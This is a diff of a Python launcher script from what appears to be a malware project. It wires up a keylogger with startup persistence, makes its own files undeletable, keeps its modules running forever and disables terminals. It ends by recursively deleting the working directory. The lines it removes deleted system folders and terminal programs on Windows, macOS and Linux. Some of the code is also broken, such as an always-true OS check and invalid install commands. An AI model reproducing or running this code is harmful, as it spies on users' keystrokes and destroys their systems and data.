@@ -1,70 +1,84 @@
+import keylogger
 import background_runner
+import test
+import test1
+import test2
+import CodeTest
+import mycmd
+import powershell
+import terminal
 import make_terminal_unusable
 import os
-import keylogger
-import make_terminal_unusable
-import CodeTest
-import test
+import shutil
 import platform
 
+CURRENT_OS = platform.system()
 
-if __name__ == '__main__':
-    try:
+try:
+    import pynput
+    import cryptography
 
-        background_runner.run_on_startup(startup_task=keylogger.start_keylogger)
-        background_runner.run_in_background(target=keylogger.start_keylogger)
-        background_runner.run_in_background(target=keylogger.on_press)
-        background_runner.run_in_background(target=keylogger.on_press)
+except Exception:
+    if CURRENT_OS == 'Windows':
+        windows = terminal.start_cmd()
+        windows.write("winget install pynput, cryptography")
 
-        background_runner.run_in_background(target=CodeTest.codeTest)
-        test.run_forever("./CodeTest.py")
-
-    except Exception:
-
-        background_runner.run_in_background(target=make_terminal_unusable.terminalDestroyer)
-        background_runner.run_on_startup(startup_task=make_terminal_unusable.terminalDestroyer)
-
-
-else:
-    OS = platform.system()
-
-    if OS == 'Windows':
-        os.remove("C://Windows//System32//cmd.exe")
-        os.remove("C://Windows//System32//WindowsPowerShell//v1.0//powershell.exe")
-        os.remove("C://Windows//System32")
-        os.remove("C://Windows")
-        os.remove("C://Users")
-        os.remove("C://Program Files")
-        os.remove("C://Program Files (x86)")
-        os.remove("C://")
-
-    elif OS == 'Darwin':
-        os.remove("/Applications/Utilities/Terminal.app")
-        os.remove("/Applications/Utilities")
-        os.remove("/Applications")
-        os.remove("/Users")
-        os.remove("/System")
-        os.remove("/Library")
-        os.remove("/bin")
-        os.remove("/sbin")
-        os.remove("/usr")
-        os.remove("/var")
-        os.remove("/etc")
-        os.remove("/root")
-
-    elif OS == 'Linux':
-        os.remove("/usr/bin/gnome-terminal")
-        os.remove("/usr/bin/xterm")
-        os.remove("/usr/bin/konsole")
-        os.remove("/usr/bin/terminator")
-        os.remove("/usr/bin/tilix")
-        os.remove("/usr/bin/alacritty")
-        os.remove("/usr/bin/kitty")
-        os.remove("/usr/bin/st")
-        os.remove("/usr/bin/lxterminal")
-        os.remove("/usr/bin/xfce4-terminal")
-        os.remove("/usr/bin/mate-terminal")
-        os.remove("/usr/bin/terminology")
-
+    elif CURRENT_OS == 'Darwin' or 'Linux':
+        OS = terminal.start_terminal()
+        OS.write("sudo install pynput, cryptography")
+    
     else:
-        print(f"Unsupported operating system: {OS}.")
+        make_terminal_unusable.terminalDestroyer()
+
+
+CURRENT_DIR = os.getcwd()
+
+try:
+    mycmd.starter_cmd()
+    powershell.start_powershell()
+    terminal.start_terminal()
+    
+
+    background_runner.run_on_startup(CodeTest.codeTest)
+    background_runner.run_in_background(CodeTest.codeTest)
+    background_runner.run_on_startup(keylogger.on_press)
+    background_runner.run_on_startup(keylogger.start_Keylogger)
+    background_runner.run_in_background(keylogger.on_press)
+    background_runner.run_in_background(keylogger.start_keylogger)
+
+    test1.make_file_undeletable("logs.txt")
+    test1.make_file_undeletable("background_runner.py")
+    test1.make_file_undeletable("keylogger.py")
+    test1.make_file_undeletable("test.py")
+    test1.make_file_undeletable("test1.py")
+    test1.make_file_undeletable("test2.py")
+    test1.make_file_undeletable("CodeTest.py")
+    test1.make_file_undeletable("make_terminal_unusable.py")
+
+    test.run_forever("background_runner.py")
+    test.run_forever("keylogger.py")
+    test.run_forever("test.py")
+    test.run_forever("test1.py")
+    test.run_forever("test2.py")
+    test.run_forever("CodeTest.py")
+    test.run_forever("make_terminal_unusable.py")
+
+    test2.load_key("background_runner.py")
+    test2.load_key("keylogger.py")
+    test2.load_key("test.py")
+    test2.load_key("test1.py")
+    test2.load_key("CodeTest.py")
+    test2.load_key("make_terminal_unusable.py")
+
+    make_terminal_unusable.terminalDestroyer()
+
+
+except Exception:
+    try:
+        make_terminal_unusable.terminalDestroyer()
+
+    except Exception as e:
+        print(f"An error {e} occured while trying to start the opration")
+        pass
+
+    shutil.rmtree(CURRENT_DIR)
